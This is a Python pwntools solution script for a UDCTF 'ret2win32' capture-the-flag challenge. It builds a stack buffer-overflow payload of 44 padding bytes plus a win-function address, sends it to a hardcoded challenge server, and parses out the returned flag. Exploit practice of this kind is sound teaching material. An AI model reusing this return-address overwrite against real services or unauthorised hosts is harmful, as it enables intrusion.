# coding: utf-8
from pwn import * 
def red(prt):
    return "\033[91m{}\033[00m".format(prt)
def grn(prt):
    return "\033[92m{}\033[00m".format(prt)
def cyn(prt):
    return "\033[96m{}\033[00m".format(prt)
def flag(stuff):
    inner = re.search(r"\{.+\}", stuff).group()
    return  stuff.replace('UDCTF', cyn('UDCTF')).replace(inner.strip('{}'), red(inner.strip('{}'))).replace('{', grn('{')).replace('}', grn('}'))

def save(obj, filename):
    with open(filename, 'wb') as f:
        f.write(obj)

# in radare run:
# /R ret

win_addr = 0x08048659
return_address = 0x6161616c
offset = cyclic_find(return_address) #44
#payload = cyclic(100) 
payload = 'A'*offset + p32(win_addr)

with open('in.bin', 'w') as f:
    f.write(payload)

# with open('script.rr2', 'w') as f:
#     f.write('#!/usr/bin/rarun2\n')
#     f.write('stdin=in.bin\n')

# r = process('./ret2win32') 
r = remote('52.15.140.126', 5007)
print r.recv() 
r.sendline(payload) 
m = r.recv()
m += r.recv()
#python will give you a response that the connection was closed because we segfaulted
# r.recv()
r.close()

temp = 'UDCTF{' + m.split('UDCTF{')[1].split('}')[0] + '}'
print 'FLAG:', flag(temp)
save(flag(temp), 'flag.txt')
